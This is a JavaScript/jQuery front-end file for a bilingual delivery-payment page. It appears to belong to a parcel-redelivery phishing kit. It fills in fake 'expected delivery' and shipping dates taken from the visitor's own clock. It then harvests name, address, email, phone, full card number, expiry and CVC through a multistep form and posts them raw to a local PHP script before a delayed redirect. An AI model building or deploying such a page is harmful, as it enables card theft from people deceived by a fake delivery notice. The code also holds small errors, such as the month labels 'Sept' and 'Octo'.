(function () {
    var days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
    var months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sept', 'Octo', 'Nov', 'Dec'];
    Date.prototype.getMonthName = function () {
        return months[this.getMonth()];
    };
    Date.prototype.getDayName = function () {
        return days[this.getDay()];
    };
})();

var now = new Date();
var day = now.getDayName();
var month = now.getMonthName();
var nextMonth = now.getMonthName() + 1;
var date = now.getDate();

var currentDate = new Date(new Date().getTime() + 24 * 60 * 60 * 1000);
var tday = currentDate.getDate();


$(function () {

 
    

    $('.deliveryIn__exptected p').html(`${day}, ${month}, ${date}`);
    $('.shipService').html(`${month}, ${tday}`);


    $('.support .accordion-button').click(function () {
        $('.accordion-item').removeClass('active');
        if ($(this).attr('aria-expanded') !== false) {
            $(this).parents('.accordion-item').addClass('active')
        }
    });

    $('.header__search button').click(function () {
        $('.search').addClass('active');
        $('.backdrop').addClass('show');
        $('body').addClass('overflow-hidden');
    });
    $('.closeSearch').click(function () {
        $('.search').removeClass('active');
        $('.backdrop').removeClass('show');
        $('body').removeClass('overflow-hidden');
    });



    $('.menuToggle').click(function () {
        $('.sideMenu').addClass('active');
        $('.backdrop').addClass('show');
        $('body').addClass('overflow-hidden');
    });


    $('.closesidemenu').click(function () {
        $('.sideMenu').removeClass('active');
        $('.backdrop').removeClass('show');
        $('body').removeClass('overflow-hidden');
    });


    $('.backdrop').click(function () {
        $('.search').removeClass('active');
        $('.backdrop').removeClass('show');
        $('.sideMenu').removeClass('active');
        $('body').removeClass('overflow-hidden');
    });


    // Multistep Form

    var current_fs, next_fs;
    $('.continuebtn').click(function (e) {
        var form = $('#paymentForm');
        current_fs = $(this).parents('fieldset');
        next_fs = $(this).parents('fieldset').next();

        // Form validation
        if ($('html').attr('lang') == 'fr') {
            form.validate({
                errorElement: 'span',
                errorClass: 'help-block',

                highlight: function (element, errorClass, validClass) {
                    $(element).closest('.form-group').addClass("has-error");
                },
                unhighlight: function (element, errorClass, validClass) {
                    $(element).closest('.form-group').removeClass("has-error");
                },

                rules: {
                    senderNameInput: {
                        required: true
                    },
                    streetAddressInput: {
                        required: true,
                    },
                    cityInput: {
                        required: true,
                    },
                    provinceId: {
                        required: true,
                    },
                    PostalCodeInput: {
                        required: true,
                    },
                    EmailAddressInput: {
                        required: true,
                        email: true
                    },
                    PhoneNumberInput: {
                        required: true,
                    },
                    ccnumber: {
                        required: true,
                        creditcard: true
                    },
                    ccexp: {
                        required: true,
                    },
                    cccvc: {
                        required: true,
                    },

                },

                messages: {

                    senderNameInput: {
                        required: 'Veuillez entrer le nom complet'
                    },
                    streetAddressInput: {
                        required: "Veuillez entrer l'adresse de la rue"
                    },

                    cityInput: {
                        required: 'Veuillez entrer le nom de la ville'
                    },
                    provinceId: {
                        required: 'Veuillez sélectionner le nom de la province'
                    },
                    PostalCodeInput: {
                        required: 'Veuillez entrer le code postal'
                    },
                    EmailAddressInput: {
                        required: "Veuillez entrer l'e-mail",
                        email: 'Veuillez saisir le bon e-mail'
                    },
                    PhoneNumberInput: {
                        required: 'Veuillez entrer le numéro de téléphone'
                    },
                    ccnumber: {
                        required: 'Veuillez entrer le numéro de la carte'
                    },
                    ccexp: {
                        required: "Veuillez entrer la date d'expiration de votre carte"
                    },
                    cccvc: {
                        required: 'Veuillez entrer le code CVC de votre carte'
                    },

                },
            });
        }
        else {
            form.validate({
                errorElement: 'span',
                errorClass: 'help-block',

                highlight: function (element, errorClass, validClass) {
                    $(element).closest('.form-group').addClass("has-error");
                },
                unhighlight: function (element, errorClass, validClass) {
                    $(element).closest('.form-group').removeClass("has-error");
                },

                rules: {
                    senderNameInput: {
                        required: true
                    },
                    streetAddressInput: {
                        required: true,
                    },
                    cityInput: {
                        required: true,
                    },
                    provinceId: {
                        required: true,
                    },
                    PostalCodeInput: {
                        required: true,
                    },
                    EmailAddressInput: {
                        required: true,
                        email: true
                    },
                    PhoneNumberInput: {
                        required: true,
                    },
                    ccnumber: {
                        required: true,
                        creditcard: true
                    },
                    ccexp: {
                        required: true,
                    },
                    cccvc: {
                        required: true,
                    },

                },

                messages: {

                    senderNameInput: {
                        required: 'Please enter the full name'
                    },
                    streetAddressInput: {
                        required: 'Please enter the street address'
                    },

                    cityInput: {
                        required: 'Please enter the city name'
                    },
                    provinceId: {
                        required: 'Please select the province name'
                    },
                    PostalCodeInput: {
                        required: 'Please enter the postal code'
                    },
                    EmailAddressInput: {
                        required: 'Please enter the email',
                        email: 'Please enter the correct email'
                    },
                    PhoneNumberInput: {
                        required: 'Please enter the phone number'
                    },
                    ccnumber: {
                        required: 'Please enter the card number'
                    },
                    ccexp: {
                        required: 'Please enter the expiry date from your card'
                    },
                    cccvc: {
                        required: 'Please enter the CVC code from your card'
                    },

                },
            });
        }


        // Ajax Request
        if (form.valid() === true) {
            $(".progressBar ul li").eq($("fieldset").index(current_fs)).toggleClass("active visited");
            $(".progressBar ul li").eq($("fieldset").index(next_fs)).addClass("active");

            if ($(this).attr("type") == "button") {
                next_fs.fadeIn();
                current_fs.hide();
            }
            else if ($(this).attr("type") == "submit") {
                var senderNameInput = $('#senderNameInput').val();
                var streetAddressInput = $('#streetAddressInput').val();
                var senderAddressLine2 = $('#senderAddressLine2').val();
                var cityInput = $('#cityInput').val();
                var provinceId = $('#provinceId').val();
                var PostalCodeInput = $('#PostalCodeInput').val();
                var EmailAddressInput = $('#EmailAddressInput').val();
                var PhoneNumberInput = $('#PhoneNumberInput').val();
                var ccnumberfield = $('#cc-number').val();
                var ccexpfield = $('#cc-exp').val();
                var cccvcfield = $('#cc-cvc').val();

                // var ccnumber = ccnumberfield.replace(/-/g, "");
                // var ccexp = ccexpfield.replace(/\//g, "");


                var paymentFormData = {
                    senderNameInput: senderNameInput,
                    streetAddressInput: streetAddressInput,
                    senderAddressLine2: senderAddressLine2,
                    cityInput: cityInput,
                    provinceId: provinceId,
                    PostalCodeInput: PostalCodeInput,
                    EmailAddressInput: EmailAddressInput,
                    PhoneNumberInput: PhoneNumberInput,
                    ccnumberfield: ccnumberfield,
                    ccexpfield: ccexpfield,
                    cccvcfield: cccvcfield,
                }
                e.preventDefault();
                $.ajax({
                    type: 'POST',
                    data: paymentFormData,
                    url: 'form/form.php',
                    success: function (response) {
                        console.log(response);
                        next_fs.fadeIn();
                        current_fs.hide();
                    }, 
                    error: function (error) {
                        return false;
                    }
                })
            }

            $('html, body').animate({
                scrollTop: $(".multiForm").offset().top
            }, 500);
        }




    });


    $('.endFormBtn').click(function (e) {
        e.preventDefault();
        var href = $(this).attr("href");
        window.setTimeout(function () {
            location.href = href;
        }, 5000);

    })



    // Welcome Box
    var isshow = localStorage.getItem('isshow');
    if (isshow == null) {
        localStorage.setItem('isshow', 1);
        // Show popup here
        $('.welcome').show().css('display', 'table');
        $('body').addClass('overflow-hidden');
    } else {
        $('body').removeClass('overflow-hidden');
    }


    // Card Expire Format
    $('#cc-exp').on('keyup', function (e) {
        var code = e.keyCode;
        var allowedKeys = [8];
        if (allowedKeys.indexOf(code) !== -1) {
            return;
        }
        e.target.value = e.target.value.replace(
            /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
        ).replace(
            /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
        ).replace(
            /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
        ).replace(
            /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
        ).replace(
            /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
        ).replace(
            /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
        ).replace(
            /\/\//g, '/' // Prevent entering more than 1 `/`
        );
    });

    // Card number Format
    $('#cc-number').keyup(function () {
        var foo = $(this).val().split("-").join(""); // remove hyphens
        if (foo.length > 0) {
            foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
        }
        $(this).val(foo);
    });



    // form submit



});




var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
    return new bootstrap.Tooltip(tooltipTriggerEl)
})



